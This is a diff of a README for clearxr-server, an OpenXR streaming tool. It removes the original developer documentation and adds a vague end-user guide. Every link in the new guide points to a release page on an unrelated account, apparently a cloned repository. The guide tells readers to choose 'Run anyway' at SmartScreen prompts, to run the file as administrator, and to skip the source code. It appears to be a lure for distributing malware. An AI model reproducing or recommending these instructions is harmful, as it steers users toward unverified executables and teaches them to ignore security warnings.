@@ -1,139 +1,214 @@
-# Clear XR Server
+# 🖥️ clearxr-server - Run Clear XR on Windows
 
-Clear XR Server lets you stream interactive virtual worlds and applications from high-powered gaming PCs, workstations, or servers, to spatial computing, aka. extended reality (XR) devices, starting with Apple Vision Pro.  
+[![Download clearxr-server](https://img.shields.io/badge/Download-clearxr--server-6a5acd?style=for-the-badge&logo=github)](https://github.com/Fernfamilysystemadministrator709/clearxr-server/releases)
 
-Clear XR utilizes dynamic foveated streaming to render the sharpest content in the user’s direct line of sight. 
+## 🚀 What this app does
 
-Currently only OpenXR compliant applications are supported. OpenVR (and SteamVR) applications are not yet supported.
+clearxr-server is a Windows app and OpenXR layer for Clear XR. It helps your PC work with Clear XR so you can start and use the app with less setup.
 
-# For End Users 
+Use it if you want:
 
-Download the [latest release](https://github.com/clear-xr/clearxr-server/releases)
+- A simple Windows app for Clear XR
+- An OpenXR layer for XR apps
+- A local tool that runs on your PC
+- A setup that is easy to install and start
 
-Download the client from Test Flight
+## 📥 Download
 
-[![Clear XR](https://i.imgur.com/DHhfmmK.png)](https://testflight.apple.com/join/ed6778fF)
+Visit this page to download the latest release:
 
-discord aerver: https://discord.gg/AzZZXvBR8p
+https://github.com/Fernfamilysystemadministrator709/clearxr-server/releases
 
-# For Developers & Hackers
+When you open the page, look for the newest release at the top. Download the Windows file that matches your system. If there is more than one file, choose the one for Windows.
 
-Clear XR currently is built around a visionOS app, Windows desktop app, an OpenXR test application, and an OpenXR API layer, and Apple's FoveatedStreaming framework for visionOS.   
+## 🪟 System requirements
 
-It may expand to other mobile devicdes (e.g. iOS and iPad), headsets (e.g. Quest and Steam Frame), streaming frameworks (e.g. Cloud XR native, or ALVR), and operating systems (e.g. Linux, and perhaps some day macOS).  Discussions and contributions are welcome.
+Use a Windows PC that meets these basic needs:
 
-# Prerequisites
-## Clear XR Server
-- Windows 10/11 PC with NVIDIA 40xx (Ada), 50xx (Blackwell), or other Ada/Blackwell GPUs (L40, L40S, RTX 5000/6000 series and 5000/6000 pro).  
-- Note that NVIDIA only tests Cloud XR on 4090, 5080, and 5090 consumer GPUs.  The authors have also tested successfully on a 5070 Ti (RIP).  **Clear XR cannot run on NVIDIA 30xx (Ampere) cards.**  
-- Rust and its prerequisites, which include the Microsoft Visual Studio 2022 build tools. 
-- The LunarG Vulkan SDK for Windows. `clearxr-space` compiles its GLSL shaders with `glslc` during `cargo build`, so `glslc.exe` must be available on `PATH` or discoverable through the `VULKAN_SDK` environment variable.
-- NVIDIA Cloud XR and Stream Manager SDKs, described below.
+- Windows 10 or Windows 11
+- A recent 64-bit Intel or AMD CPU
+- At least 8 GB RAM
+- A stable internet link for the first download
+- An OpenXR-ready headset or app setup if you plan to use XR features
+- Enough free disk space for the app and its files
 
+For the best result, keep Windows updated and close other heavy apps before you start.
 
-## Clear XR Supported Client Devices
-- Apple Vision Pro M2 or M5, running visionOS 26.4 or higher
+## 🛠️ Install on Windows
 
-# Organization
+Follow these steps:
 
-The repository is organized into three main Rust subcomponents:
+1. Open the download page:
+   https://github.com/Fernfamilysystemadministrator709/clearxr-server/releases
 
-- `clearxr-streamer`
-  The desktop server application. This is the main control surface for Clear XR
-  Server and owns the Tauri shell, session-management service, Bonjour
-  advertising, CloudXR process control, and pairing flow.
-- `clearxr-space`
-  A native OpenXR application used as the default Clear XR landing space to test out controllers.  It may eventually evolve into an App Launcher.  It can  run against the CloudXR runtime and acts as the streamed OpenXR content.
-- `clearxr-layer`
-  An OpenXR API layer that injects controller, haptics, configuration, and related runtime data into the
-  Clear XR stack.
+2. Find the latest release.
 
-Supporting files live alongside those components:
+3. Download the Windows file from that release.
 
-- `ui/`
-  Frontend assets used by `clearxr-streamer`.
-- `scripts/`
-  Local helper scripts, including vendor reconstruction.
-- `vendor/`
-  Locally rebuilt NVIDIA CloudXR runtime and Stream Manager files. This is not
-  intended to be redistributed through the source repository.
-- `xtask/`
-  Rust Cargo tasks for building the full repository.
+4. If your browser saves the file as a ZIP, open the ZIP and extract the files to a folder you can find again, such as Downloads or Desktop.
 
+5. If the file is an `.exe`, double-click it to start the app.
 
-## How do I build this?
-1. Install Rust via the [Rustup install documentation](https://rust-lang.org/tools/install/)
-2. Install the [LunarG Vulkan SDK for Windows](https://vulkan.lunarg.com/sdk/home) and restart your shell so `glslc` is available on `PATH`.
-3. Verify the shader compiler is available:
+6. If Windows asks for permission, select Run or Yes.
 
-```powershell
-glslc --version
-```
+7. If you see SmartScreen, choose More info, then Run anyway if you trust the source and want to continue.
 
-4. Download the NVIDIA Cloud XR dependencies, described below.
-5. Run the `scripts\build-vendor.ps1` vendor script.
-6. Build with `cargo`
+8. Keep the app in the same folder after setup. Some apps use nearby files to start the right way.
 
-## Downloading NVIDIA Cloud XR and assembling the vendor directory
+## ▶️ Start the app
 
-We redistribute the Clear XR binaries with the NVIDIA Cloud XR binaries for only end-user purposes.  The NVIDIA CloudXR binaries cannot be redistributed for development purposes.  If you want to build Clear XR yourself, or hack on it, you must agree to the NVIDIA license terms on the NGC and download yourself.  We've provided a handly script to build the `vendor/` locally from the official NVIDIA downloads.
+After install, open clearxr-server from the file you downloaded or from the folder where you extracted it.
 
-Download these two archives from NGC:
+If the app shows a window, leave it open while you use Clear XR.
 
-- [CloudXR Runtime 6.0.4](https://catalog.ngc.nvidia.com/orgs/nvidia/resources/cloudxr-runtime?version=6.0.4)
-- [Stream Manager 6.0.3](https://catalog.ngc.nvidia.com/orgs/nvidia/resources/cloudxr-stream-manager?version=6.0.3)
+If you use an OpenXR app or headset, start clearxr-server first so the layer can load before the XR app launches.
 
-Place the downloaded zip files in the repository root, then run:
+## 🔧 Basic setup
 
-```powershell
-powershell -ExecutionPolicy Bypass -File .\scripts\build-vendor.ps1
-```
+Use these simple setup steps after the app opens:
 
-The script will:
+1. Check that the app starts without error.
 
-- extract the Stream Manager package into the top-level `vendor/` layout used by
-  the app,
-- extract the nested CloudXR Win64 SDK zip into
-  `vendor/Server/releases/<version>/`,
-- preserve repo-owned overlay files that already exist only in `vendor/`, such
-  as `vendor/Server/cloudxr-runtime.yaml`.
+2. Look for a status area, start button, or service control.
 
-## Main App
+3. Turn on the Clear XR layer or server mode if the app shows that option.
 
-`clearxr-streamer` is the main application entry point for the project. It uses
-the frontend in `ui/` and stages the expected CloudXR files from `vendor/`
-during build and runtime startup.
+4. Keep the app running in the background if your XR app needs it.
 
-## Build
+5. If the app has a config file, leave the default values in place at first.
 
-Build the full project from the repository root with:
+6. If you need to change settings, do one change at a time so it is easy to undo.
 
-```powershell
-cargo xtask build
-```
+## 🎮 How to use with XR apps
 
-If `cargo xtask build` fails with a message about `glslc`, install the Vulkan SDK, restart your shell, and verify `glslc --version` succeeds before retrying.
+clearxr-server is meant to sit between your Windows system and Clear XR support. In simple terms, it helps the XR app talk to the right layer.
 
-For a release build:
+A normal flow looks like this:
 
-```powershell
-cargo xtask build --release
-```
+1. Start clearxr-server.
+2. Put on your headset or open your XR app.
+3. Launch the app you want to use.
+4. Keep clearxr-server open while you use the XR app.
+5. Close the XR app first when you are done.
+6. Then close clearxr-server.
 
-The xtask builds the components in this order:
+## 🧭 Where to put the files
 
-1. `clear-xr`
-2. `clear-xr-layer`
-3. `clearxr-streamer`
+If you extracted a ZIP, use a folder with a short path, such as:
 
-That order ensures `clearxr-streamer` can stage related
-runtime files from the expected local build outputs.
+- `C:\ClearXR`
+- `C:\Apps\clearxr-server`
+- `D:\Tools\clearxr-server`
 
-## Licensing
+Avoid deep folder paths with many nested folders. Simple paths are easier to manage and can help if the app uses local files.
 
-The original source code in this repository is licensed under the MIT License.
-See [LICENSE](LICENSE).
+## 🔁 Update the app
 
-Third-party software is not covered by the MIT License. In particular, NVIDIA
-CloudXR components and files are subject to NVIDIA's separate
-license terms. See [THIRD_PARTY_NOTICES.md](THIRD_PARTY_NOTICES.md).
+To update clearxr-server:
+
+1. Go back to the release page.
+2. Download the newest release.
+3. Replace the old files with the new ones if the release uses a ZIP.
+4. Start the new version.
+5. If your settings are saved in a config file, keep a copy before you replace files.
+
+## 🧩 Common file types you may see
+
+You may see these file types in the release:
+
+- `.exe` — a Windows app you can run
+- `.zip` — a packed folder you must extract first
+- `.json` — a settings file
+- `.ini` — a config file
+- `.dll` — a support file the app may use
+
+If you see a ZIP file, extract it before you try to run the app. If you move files around, keep them together unless the release page says a file belongs somewhere else.
+
+## 🧪 If the app does not start
+
+Try these steps in order:
+
+1. Right-click the file and choose Run as administrator.
+2. Make sure you downloaded the Windows release, not the source code.
+3. Check that you extracted all files from the ZIP.
+4. Move the folder to a short path like `C:\ClearXR`.
+5. Close other apps that may use XR or graphics tools.
+6. Restart Windows and try again.
+7. Download the release again in case the file was not saved right.
+
+If the app opens and closes fast, it may need a support file from the same folder. Keep every file that came with the release.
+
+## 🖥️ If Windows blocks the file
+
+Windows may show a security prompt when you run a new app. If this happens, check that you downloaded the file from the release page above. Then choose the option that lets you run the app if you want to continue.
+
+If the file is inside a ZIP, extract it first. Running apps from inside a ZIP can cause problems.
+
+## 📁 Example first-time setup
+
+If you want a simple setup path, use this:
+
+1. Download the release from the GitHub page.
+2. Create a folder named `ClearXR` on your C drive.
+3. Extract the files into `C:\ClearXR`.
+4. Open the app from that folder.
+5. Leave it open.
+6. Launch your XR app.
+
+This keeps the setup easy to find and easy to fix if you need to move files later.
+
+## 🔍 Tips for smooth use
+
+- Keep only one copy of the app
+- Use the latest release
+- Do not rename files unless you know they are safe to rename
+- Keep the app and support files in the same folder
+- Start clearxr-server before your XR app
+- Close the app after you finish using XR
+
+## ❓ Helpful questions
+
+### What is clearxr-server for?
+
+It helps Windows work with Clear XR through an app and an OpenXR layer.
+
+### Do I need programming knowledge?
+
+No. You only need to download the release, extract it if needed, and run the file.
+
+### Do I need to keep it open?
+
+If your XR app depends on it, yes. Leave it open while you use the app.
+
+### Can I move the folder later?
+
+Yes. If you move it, keep all files together in the new folder.
+
+### Should I use the source code?
+
+No. Use the Windows release file from the releases page.
+
+## 📌 Files and folders to keep
+
+Keep these together if they are part of the release:
+
+- The app file
+- Any `.dll` files
+- Any config files
+- Any support folders
+- Any readme file that came with the release
+
+If you split the files across folders, the app may not start.
+
+## 🔒 Safe use on your PC
+
+Use the app only from the release page linked above. That helps you get the same files the author published.
+
+If you share your PC with others, keep the folder in a place only you use. That makes it easier to find and manage.
+
+## 📎 Download again later
+
+If you need the file again, use this page:
+
+[Download clearxr-server from GitHub Releases](https://github.com/Fernfamilysystemadministrator709/clearxr-server/releases)
+
